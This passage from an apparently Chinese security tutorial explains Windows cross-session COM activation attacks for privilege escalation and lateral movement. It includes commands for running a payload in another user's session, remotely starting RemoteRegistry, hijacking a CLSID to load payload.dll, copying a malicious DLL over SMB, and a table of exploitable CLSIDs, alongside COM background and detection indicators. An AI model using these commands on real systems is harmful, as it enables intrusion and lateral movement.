+<h4 id="场景一：本地跨会话（同一台机器）"><a href="#场景一：本地跨会话（同一台机器）" class="headerlink" title="场景一：本地跨会话（同一台机器）"></a>场景一：本地跨会话（同一台机器）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">攻击者已在这台机器上有管理员权限（如服务账户）</span><br><span class="line">目标：借用另一个交互式用户的身份执行代码</span><br><span class="line"></span><br><span class="line">攻击者（会话 0，服务账户）</span><br><span class="line">  → 激活本机的 COM 对象</span><br><span class="line">  → 通过 SetSessionId 切换到目标会话</span><br><span class="line">  → 代码在 Administrator（会话 1）中执行</span><br><span class="line"></span><br><span class="line">典型场景：</span><br><span class="line">  - 攻击者通过 Web 漏洞获得了服务账户权限</span><br><span class="line">  - 服务账户权限有限，想借用管理员的身份</span><br><span class="line">  - 发现管理员正在使用这台机器</span><br><span class="line">  → 用 CSA 在管理员会话中执行代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令示例（本地）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># IHxExec - 本地跨会话执行</span></span><br><span class="line">IHxExec.exe -s 1 -c C:/Windows/system32/calc.exe</span><br><span class="line"><span class="comment"># -s 1 = 本机的会话 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SessionHop - 本地会话跳转</span></span><br><span class="line">SessionHop.exe 2 C:\temp\demon.x64.exe</span><br><span class="line"><span class="comment"># 在本机会话 2 中执行 demon.x64.exe</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="场景二：远程跨机器（横向移动）"><a href="#场景二：远程跨机器（横向移动）" class="headerlink" title="场景二：远程跨机器（横向移动）"></a>场景二：远程跨机器（横向移动）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">攻击者在机器 A（10.0.0.10）</span><br><span class="line">目标：在机器 B（10.0.0.13）的用户会话中执行代码</span><br><span class="line"></span><br><span class="line">机器 A 的攻击者</span><br><span class="line">  → 通过 DCOM 远程激活机器 B 上的 COM 对象</span><br><span class="line">  → 代码在机器 B 的 Administrator（会话 1）中执行</span><br><span class="line"></span><br><span class="line">典型场景：</span><br><span class="line">  - 攻击者在内网横向移动中</span><br><span class="line">  - 发现机器 B 有管理员正在使用</span><br><span class="line">  - 通过 DCOM 在机器 B 的管理员会话中执行代码</span><br><span class="line">  → 实现横向移动，且行为隐蔽</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令示例（远程）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 步骤 1：远程查询机器 B 的会话</span></span><br><span class="line">quser /server:10.0.0.13</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 2：远程启动机器 B 的 RemoteRegistry 服务</span></span><br><span class="line">sc \\10.0.0.13 start RemoteRegistry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 3：远程修改机器 B 的注册表（COM 劫持）</span></span><br><span class="line">ComHijackWrite.exe 10.0.0.13 S-1-5-21-xxx-500 &#123;F87B28F1...&#125; C:\temp\payload.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 4：通过 WMI 远程激活 COM 对象</span></span><br><span class="line">sppui.exe 10.0.0.13 2 Administrator Password123 ipurple.lab <span class="string">&quot;cmd.exe /c whoami &gt; C:\out.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="两种场景对比"><a href="#两种场景对比" class="headerlink" title="两种场景对比"></a>两种场景对比</h4><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>本地跨会话</th>
+<th>远程跨机器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>网络流量</td>
+<td>无网络流量（本地调用）</td>
+<td>有网络流量（DCOM&#x2F;WMI）</td>
+</tr>
+<tr>
+<td>需要的权限</td>
+<td>本机管理员权限</td>
+<td><strong>远程</strong>管理员权限</td>
+</tr>
+<tr>
+<td>RemoteRegistry 服务</td>
+<td>不需要</td>
+<td><strong>需要远程运行</strong></td>
+</tr>
+<tr>
+<td>活跃交互式会话</td>
+<td>本机需要</td>
+<td><strong>目标机器</strong>需要</td>
+</tr>
+<tr>
+<td>注册表修改</td>
+<td>本地修改</td>
+<td><strong>远程修改</strong>（通过 RemoteRegistry）</td>
+</tr>
+<tr>
+<td>检测难度</td>
+<td>更难（无网络痕迹）</td>
+<td>相对容易（有网络流量 + WMI 痕迹）</td>
+</tr>
+<tr>
+<td>DLL&#x2F;EXE 上传</td>
+<td>不需要（已有本地权限）</td>
+<td><strong>需要远程上传</strong></td>
+</tr>
+<tr>
+<td>使用场景</td>
+<td>权限提升（借用管理员身份）</td>
+<td><strong>横向移动</strong>（跨机器执行）</td>
+</tr>
+</tbody></table>
+<h4 id="远程跨机器的完整原理"><a href="#远程跨机器的完整原理" class="headerlink" title="远程跨机器的完整原理"></a>远程跨机器的完整原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">为什么远程跨机器可行？</span><br><span class="line"></span><br><span class="line">1. DCOM 是 Windows 内置功能</span><br><span class="line">   CoCreateInstanceEx() 可以指定远程机器 IP</span><br><span class="line">   Windows 自动通过 RPC/DCOM 协议与远程机器通信</span><br><span class="line">   在远程机器上创建 COM 对象实例</span><br><span class="line"></span><br><span class="line">2. 远程注册表服务</span><br><span class="line">   RemoteRegistry 服务允许远程读写注册表</span><br><span class="line">   攻击者通过它远程修改 CLSID 的 InprocServer32/LocalServer32</span><br><span class="line">   将 DLL/EXE 路径改为恶意载荷</span><br><span class="line"></span><br><span class="line">3. 远程会话枚举</span><br><span class="line">   WTSOpenServer + WTSEnumerateSessions 可以跨网络查询会话</span><br><span class="line">   攻击者可以批量扫描网段，找到有交互式会话的目标</span><br><span class="line"></span><br><span class="line">4. 远程 COM 激活</span><br><span class="line">   COM 对象的 AppID 配置了 LaunchPermission</span><br><span class="line">   如果包含远程激活权限 + 攻击者有管理员凭证</span><br><span class="line">   → 可以在远程机器的指定会话中激活 COM 对象</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程攻击的检测特征"><a href="#远程攻击的检测特征" class="headerlink" title="远程攻击的检测特征"></a>远程攻击的检测特征</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">远程 CSA 比本地 CSA 多出以下检测特征：</span><br><span class="line"></span><br><span class="line">  1. 网络流量</span><br><span class="line">     DCOM/RPC 通信（端口 135 + 动态端口）</span><br><span class="line">     WMI 通信（端口 135 + 动态端口）</span><br><span class="line"></span><br><span class="line">  2. WMI 痕迹</span><br><span class="line">     目标机器上 WmiPrvSE.exe 创建子进程</span><br><span class="line">     Win32_Process.Create 调用记录</span><br><span class="line"></span><br><span class="line">  3. 远程注册表访问</span><br><span class="line">     远程注册表连接事件</span><br><span class="line">     Event ID 4663 中的远程来源</span><br><span class="line"></span><br><span class="line">  4. SMB 文件传输</span><br><span class="line">     copy \\&lt;TARGET&gt;\C$\... 的网络日志</span><br><span class="line">     SMB 共享访问日志</span><br></pre></td></tr></table></figure>
+
+<h4 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CSA 既可以本地跨会话，也可以跨机器横向移动</span><br><span class="line">  - 本地：无网络痕迹，主要用于权限提升（借用管理员身份）</span><br><span class="line">  - 远程：通过 DCOM，主要用于横向移动（跨机器执行）</span><br><span class="line">  - 两者共享相同的 COM 劫持原理，区别在于&quot;从哪里发起激活&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、Windows-COM-基础"><a href="#二、Windows-COM-基础" class="headerlink" title="二、Windows COM 基础"></a>二、Windows COM 基础</h2><h3 id="2-1-什么是-COM？"><a href="#2-1-什么是-COM？" class="headerlink" title="2.1 什么是 COM？"></a>2.1 什么是 COM？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">COM（Component Object Model）= 组件对象模型</span><br><span class="line"></span><br><span class="line">Windows 的核心架构之一，允许不同程序之间互相调用功能</span><br><span class="line">例如：</span><br><span class="line">  Excel 调用 Word 打开文档 → 通过 COM</span><br><span class="line">  右键文件选择&quot;打开方式&quot; → 通过 COM 找到能处理的应用</span><br><span class="line">  系统服务之间互相通信 → 通过 COM/DCOM</span><br><span class="line"></span><br><span class="line">COM 对象存储在 Windows 注册表中</span><br><span class="line">每个 COM 对象有唯一的 CLSID（Class ID，GUID 格式）</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-CLSID-和-AppID"><a href="#2-2-CLSID-和-AppID" class="headerlink" title="2.2 CLSID 和 AppID"></a>2.2 CLSID 和 AppID</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CLSID（Class ID）= COM 对象的身份证号</span><br><span class="line">  格式：&#123;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&#125;</span><br><span class="line">  例如：&#123;F87B28F1-DA9A-4F35-8EC0-800EFCF26B83&#125;（sppui）</span><br><span class="line"></span><br><span class="line">AppID（Application ID）= COM 应用的配置文件</span><br><span class="line">  存放位置：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppID</span><br><span class="line">  包含：启动方式、运行身份、权限配置等</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-RunAs-配置：理解-CSA-的基础"><a href="#2-3-RunAs-配置：理解-CSA-的基础" class="headerlink" title="2.3 RunAs 配置：理解 CSA 的基础"></a>2.3 RunAs 配置：理解 CSA 的基础</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AppID 注册表中的 RunAs 字段决定了 COM 对象以什么身份运行：</span><br><span class="line"></span><br><span class="line">  RunAs = &quot;Interactive User&quot;  → 以当前交互式用户身份运行</span><br><span class="line">  RunAs = &quot;Launching User&quot;    → 以启动它的用户身份运行</span><br><span class="line">  RunAs = &quot;System Account&quot;    → 以 SYSTEM 身份运行</span><br><span class="line"></span><br><span class="line">CSA 攻击利用的就是 RunAs = &quot;Interactive User&quot; 的 COM 对象</span><br><span class="line">因为这类 COM 对象会在&quot;正在使用电脑的用户&quot;的会话中启动</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、Windows-会话机制"><a href="#三、Windows-会话机制" class="headerlink" title="三、Windows 会话机制"></a>三、Windows 会话机制</h2><h3 id="3-1-什么是会话（Session）？"><a href="#3-1-什么是会话（Session）？" class="headerlink" title="3.1 什么是会话（Session）？"></a>3.1 什么是会话（Session）？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows 会话 = 用户的独立工作空间</span><br><span class="line"></span><br><span class="line">每台 Windows 机器可以同时有多个会话：</span><br><span class="line">  会话 0：系统服务运行空间（svchost、lsass 等）</span><br><span class="line">  会话 1：第一个交互式用户（你看到的桌面）</span><br><span class="line">  会话 2：第二个用户通过 RDP 登录</span><br><span class="line">  会话 3：第三个用户通过 RDP 登录</span><br><span class="line"></span><br><span class="line">每个会话有独立的：</span><br><span class="line">  桌面 / 窗口站</span><br><span class="line">  进程空间</span><br><span class="line">  注册表用户配置（HKCU）</span><br><span class="line">  环境变量</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-如何查看会话"><a href="#3-2-如何查看会话" class="headerlink" title="3.2 如何查看会话"></a>3.2 如何查看会话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地会话查询</span></span><br><span class="line">C:\&gt; quser</span><br><span class="line"></span><br><span class="line">  用户名           会话ID   状态</span><br><span class="line">  Administrator     1       Active        ← 正在使用这台机器</span><br><span class="line">  User2             2       Disc          ← RDP 断开了</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程会话查询</span></span><br><span class="line">C:\&gt; quser /server:10.0.0.13</span><br><span class="line"></span><br><span class="line">  用户名           会话ID   状态</span><br><span class="line">  Administrator     1       Active        ← 目标！他在用这台机器</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-为什么”交互式会话”是前提？"><a href="#3-3-为什么”交互式会话”是前提？" class="headerlink" title="3.3 为什么”交互式会话”是前提？"></a>3.3 为什么”交互式会话”是前提？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CSA 的核心条件：目标用户必须有活跃的交互式会话</span><br><span class="line"></span><br><span class="line">原因：</span><br><span class="line">  RunAs = Interactive User 的 COM 对象</span><br><span class="line">  只能在有&quot;正在使用电脑&quot;的用户的会话中启动</span><br><span class="line">  </span><br><span class="line">  如果目标用户断开了 RDP（状态 Disc）</span><br><span class="line">  → 没有交互式会话</span><br><span class="line">  → COM 对象无法在该会话中激活</span><br><span class="line">  → 攻击失败</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、CSA-完整攻击流程"><a href="#四、CSA-完整攻击流程" class="headerlink" title="四、CSA 完整攻击流程"></a>四、CSA 完整攻击流程</h2><h3 id="4-1-前提条件"><a href="#4-1-前提条件" class="headerlink" title="4.1 前提条件"></a>4.1 前提条件</h3><p>原文列出了五个前提条件，但需要注意：<strong>本地 CSA 和远程 CSA 的前提条件不同</strong>。很多资料把远程场景的条件混在一起，容易造成误解。</p>
+<h4 id="场景一：本地-CSA-的前提条件"><a href="#场景一：本地-CSA-的前提条件" class="headerlink" title="场景一：本地 CSA 的前提条件"></a>场景一：本地 CSA 的前提条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者已经在目标机器上获得了代码执行权限（如通过 Web 漏洞）</span><br><span class="line">目标：借用另一个交互式用户的身份执行代码</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>必须&#x2F;可选</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>代码执行能力</td>
+<td><strong>必须</strong></td>
+<td>已经能在目标机器上执行代码（这是起点）</td>
+</tr>
+<tr>
+<td>活跃的交互式会话</td>
+<td><strong>必须</strong></td>
+<td>RunAs&#x3D;Interactive User 的 COM 对象需要有用户正在使用机器</td>
+</tr>
+<tr>
+<td>COM 类配置为 RunAs&#x3D;Interactive User</td>
+<td><strong>必须</strong></td>
+<td>这是 CSA 的定义性条件，没有例外</td>
+</tr>
+<tr>
+<td>有该 COM 类的 Launch&#x2F;Activation 权限</td>
+<td><strong>必须</strong></td>
+<td>由 AppID 的 LaunchPermission 决定，不一定需要管理员</td>
+</tr>
+<tr>
+<td>修改 HKCU 注册表的权限</td>
+<td><strong>必须</strong></td>
+<td>普通用户权限即可，不需要管理员</td>
+</tr>
+<tr>
+<td>管理员权限</td>
+<td><strong>可选</strong></td>
+<td>只有修改 HKLM（系统级注册表）时才需要，但通常修改 HKCU 就够了</td>
+</tr>
+<tr>
+<td>RemoteRegistry 服务</td>
+<td><strong>不需要</strong></td>
+<td>本地操作，直接修改本地注册表</td>
+</tr>
+</tbody></table>
+<h4 id="场景二：远程-CSA（横向移动）的前提条件"><a href="#场景二：远程-CSA（横向移动）的前提条件" class="headerlink" title="场景二：远程 CSA（横向移动）的前提条件"></a>场景二：远程 CSA（横向移动）的前提条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者在机器 A，要远程在机器 B 的用户会话中执行代码</span><br><span class="line">这是 CSA 作为横向移动技术的核心场景</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>必须&#x2F;可选</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>网络可达</td>
+<td><strong>必须</strong></td>
+<td>攻击者能访问目标机器（网络层连通）</td>
+</tr>
+<tr>
+<td>管理员权限</td>
+<td><strong>必须</strong></td>
+<td>远程修改注册表、启动 RemoteRegistry、文件传输都需要</td>
+</tr>
+<tr>
+<td>远程注册表服务（RemoteRegistry）</td>
+<td><strong>必须</strong></td>
+<td>需要远程修改目标机器的注册表（默认禁用，管理员可远程启动）</td>
+</tr>
+<tr>
+<td>活跃的交互式会话</td>
+<td><strong>必须</strong></td>
+<td>目标用户必须正在使用远程机器（RDP Disconnected 状态不行）</td>
+</tr>
+<tr>
+<td>COM 类配置为 RunAs&#x3D;Interactive User</td>
+<td><strong>必须</strong></td>
+<td>同本地场景，CSA 的定义性条件</td>
+</tr>
+<tr>
+<td>有该 COM 类的 Launch&#x2F;Activation 权限</td>
+<td><strong>必须</strong></td>
+<td>由 AppID 的 LaunchPermission 决定，且需要支持远程激活</td>
+</tr>
+<tr>
+<td>远程文件传输能力</td>
+<td><strong>必须</strong></td>
+<td>需要将 DLL&#x2F;EXE 上传到目标机器（通过 SMB 共享等）</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-完整攻击步骤"><a href="#4-2-完整攻击步骤" class="headerlink" title="4.2 完整攻击步骤"></a>4.2 完整攻击步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────┐</span><br><span class="line">│  步骤 1：枚举符合条件的 COM 对象                         │</span><br><span class="line">│  找到 RunAs = Interactive User 的 CLSID                  │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  步骤 2：枚举目标会话                                    │</span><br><span class="line">│  确定目标用户的会话 ID 和交互状态                         │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  步骤 3：准备执行环境                                    │</span><br><span class="line">│  启动远程注册表服务，上传 DLL/EXE                         │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  步骤 4：发现可劫持路径                                  │</span><br><span class="line">│  用 ComDiver 找到可写且优先级更高的注册表路径              │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  步骤 5：执行 COM 劫持                                   │</span><br><span class="line">│  写入恶意 DLL/EXE 路径到注册表                           │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  步骤 6：激活 COM 对象                                   │</span><br><span class="line">│  在目标会话中激活 COM 对象，代码执行                      │</span><br><span class="line">└─────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-步骤详解"><a href="#4-3-步骤详解" class="headerlink" title="4.3 步骤详解"></a>4.3 步骤详解</h3><h4 id="步骤-1：枚举符合条件的-COM-对象"><a href="#步骤-1：枚举符合条件的-COM-对象" class="headerlink" title="步骤 1：枚举符合条件的 COM 对象"></a>步骤 1：枚举符合条件的 COM 对象</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 工具：PermissionHunter（COMThanasia 套件之一）</span></span><br><span class="line"><span class="comment"># 作者：Michael Zhmaylo（CICADA8 Research）</span></span><br><span class="line">PermissionHunter.exe -outfile result -outformat xlsx</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤条件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. RunAs = Interactive User</span><br><span class="line">2. LaunchAccess = Remote Activation</span><br><span class="line">3. LaunchPrincipal = Everyone / Administrator / Empty</span><br></pre></td></tr></table></figure>
+
+<p><strong>已知符合条件的高危 CLSID：</strong></p>
+<table>
+<thead>
+<tr>
+<th>应用名称</th>
+<th>AppID</th>
+<th>示例 CLSID</th>
+<th>权限主体</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Speech Runtime</td>
+<td>{1725704B-A716-4E04-8EF6-87ED4F0A180A}</td>
+<td>{38FE8DFE-B129-452B-A215-119382B89E3D}</td>
+<td>Administrators, SYSTEM</td>
+</tr>
+<tr>
+<td>sppui</td>
+<td>{0868DC9B-D9A2-4f64-9362-133CEA201299}</td>
+<td>{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}</td>
+<td>Administrators, SYSTEM, NETWORK SERVICE</td>
+</tr>
+<tr>
+<td>Auth UI CredUI</td>
+<td>{924DC564-16A6-42EB-929A-9A61FA7DA06F}</td>
+<td>{924DC564-16A6-42EB-929A-9A61FA7DA06F}</td>
+<td>Administrators, SYSTEM, SERVICE</td>
+</tr>
+<tr>
+<td>Auth UI CredUI (PPL)</td>
+<td>{92EE891F-9738-41D7-BE72-504569F7E565}</td>
+<td>{92EE891F-9738-41D7-BE72-504569F7E565}</td>
+<td>Administrators, SYSTEM, LOCAL SERVICE</td>
+</tr>
+<tr>
+<td>MpUx Agent Host</td>
+<td>{1111A26D-EF95-4A45-9F55-21E52ADF9887}</td>
+<td>—</td>
+<td>Administrators, SYSTEM, LOCAL SERVICE</td>
+</tr>
+<tr>
+<td>Security Health Agent Host</td>
+<td>{1D278EEF-5C38-4F2A-8C7D-D5C13B662567}</td>
+<td>—</td>
+<td>Administrators, SYSTEM, LOCAL SERVICE</td>
+</tr>
+<tr>
+<td>Windows Push Notification</td>
+<td>{362cc086-4d81-4824-bbb5-666d34b3197d}</td>
+<td>—</td>
+<td>Administrators, SYSTEM, LOCAL SERVICE</td>
+</tr>
+<tr>
+<td>ShellServiceHost</td>
+<td>{4839DDB7-58C2-48F5-8283-E1D1807D0D7D}</td>
+<td>—</td>
+<td>Administrators, SYSTEM</td>
+</tr>
+<tr>
+<td>DockInterface COM server</td>
+<td>{b21858c6-9711-4257-99c8-5c0084bebce1}</td>
+<td>—</td>
+<td>Administrators, SYSTEM</td>
+</tr>
+<tr>
+<td>ActivatableApplication Registrar</td>
+<td>{f59bbec1-0907-4464-b04d-1da329585370}</td>
+<td>{dea794e0-1c1d-4363-b171-98d0b1703586}</td>
+<td>Administrators, SYSTEM</td>
+</tr>
+<tr>
+<td>AppServiceContainerBroker</td>
+<td>{37399c92-dc3f-4b55-ae5b-811ee82398ad}</td>
+<td>{37399c92-dc3f-4b55-ae5b-811ee82398ad}</td>
+<td>Administrators</td>
+</tr>
+</tbody></table>
+<p><strong>也可使用内存扫描工具：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CLSIDBruteforceScanner - 内存中扫描主机上所有 CLSID</span></span><br><span class="line">dotnet inline-execute /home/kali/Downloads/CLSIDBruteforceScanner.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-2：枚举目标会话"><a href="#步骤-2：枚举目标会话" class="headerlink" title="步骤 2：枚举目标会话"></a>步骤 2：枚举目标会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法 1：Windows 内置工具</span></span><br><span class="line">quser                          <span class="comment"># 本地查询</span></span><br><span class="line">quser /server:dc.ipurple.lab   <span class="comment"># 远程查询</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 2：SessionEnumeration 工具（支持 IP 范围扫描）</span></span><br><span class="line"><span class="comment"># 可以批量扫描子网，快速发现适合 CSA 攻击的目标</span></span><br><span class="line"><span class="comment"># 相比 quser 只能查询单台主机，效率更高</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">会话枚举需要的 API：</span><br><span class="line">  WTSOpenServer          → 连接到远程终端服务器</span><br><span class="line">  WTSEnumerateSessions   → 枚举所有会话</span><br><span class="line">  WTSQuerySessionInformation → 查询会话详细信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-3：准备执行环境"><a href="#步骤-3：准备执行环境" class="headerlink" title="步骤 3：准备执行环境"></a>步骤 3：准备执行环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查目标机器的远程注册表服务状态</span></span><br><span class="line">shell sc \\&lt;TARGET&gt; query RemoteRegistry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果未运行，远程启动它（需要管理员权限）</span></span><br><span class="line">shell sc \\&lt;TARGET&gt; start RemoteRegistry</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么需要 RemoteRegistry？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CSA 攻击需要修改目标机器的注册表（CLSID 劫持）</span><br><span class="line">如果攻击者已经在目标机器上有进程 → 可以直接修改本地注册表</span><br><span class="line">如果攻击者通过网络远程攻击 → 需要 RemoteRegistry 服务来远程修改</span><br><span class="line"></span><br><span class="line">RemoteRegistry 默认在现代 Windows 上是禁用的</span><br><span class="line">但管理员可以远程启动它</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传恶意 DLL 到目标机器</span></span><br><span class="line">copy payload.dll \\&lt;TARGET&gt;\C$\Windows\Temp\payload.dll</span><br></pre></td></tr></table></figure>
+
